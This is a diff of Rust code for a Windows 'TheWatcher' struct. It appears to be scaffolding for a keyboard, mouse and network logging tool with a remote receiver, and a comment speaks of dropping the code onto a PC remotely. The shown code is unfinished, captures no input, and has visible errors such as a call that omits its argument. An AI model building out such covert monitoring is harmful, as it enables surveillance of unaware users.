@@ -13,20 +13,20 @@ use windows::{
 
 #[allow(non_camel_case_types)]
 pub enum LoggingOptions {
-    ALL,
+    // <Windows tail title>: receiver IP / DNS address
+    NETWORK_ACTIVITY_MODE,
     KEYBOARD_ONLY,
     MOUSE_ONLY,
-    NETWORK_ACTIVITY_MODE,
+    ALL,
 }
 
 pub struct TheWatcher {
-    // type.c_ulong
-    pid: u32,
+    pid: u32,                           // type.c_ulong
     logging_flag: bool,
     output_path: &'static str,
     csv_option: bool,
     option: LoggingOptions,
-    // target: process::Something ,
+    target: String,
     // data_bus_stream: Someting,
     buffered_data: BufferedData,
 }
@@ -57,7 +57,7 @@ impl TheWatcher {
         let logging_flag = true;
         let csv_option = false;
         let option = LoggingOptions::ALL;
-        // let target= process::new()
+        let target: String= String::new();
         // let data_bus_stream= something;
 
         let buffered_data = BufferedData::new();
@@ -69,10 +69,12 @@ impl TheWatcher {
             csv_option,
             option,
             buffered_data,
-        } // target, data_bus_stream
+            target,
+        } // data_bus_stream
     }
 
-    unsafe fn get_name_process(pid: u32)-> windows::core::Result<String>{ // unit test done
+    // fn get_name_process - unit test done
+    unsafe fn get_name_process(pid: u32)-> windows::core::Result<String>{ 
         let handle= OpenProcess(
             PROCESS_QUERY_LIMITED_INFORMATION,
             false,
@@ -98,11 +100,14 @@ impl TheWatcher {
         //  just conect PC, and then drop that code remotely.
         let setted_target= cfg_select! {
             windows => {
-                let string_target_path= match get_name_process(){
-                    Ok(_string) => { return _string },
-                    Err(e) => { return "".to_string() };
-                }
-
+                let mut string_target_path= String::new();
+                unsafe{
+                    string_target_path= match get_name_process(){
+                        Ok(_string) => { return _string },
+                        Err(e) => { return "".to_string() };
+                    };
+                };
+                self.target= string_target_path;
             },
             _ => {
                 // @TODO hook a daemon
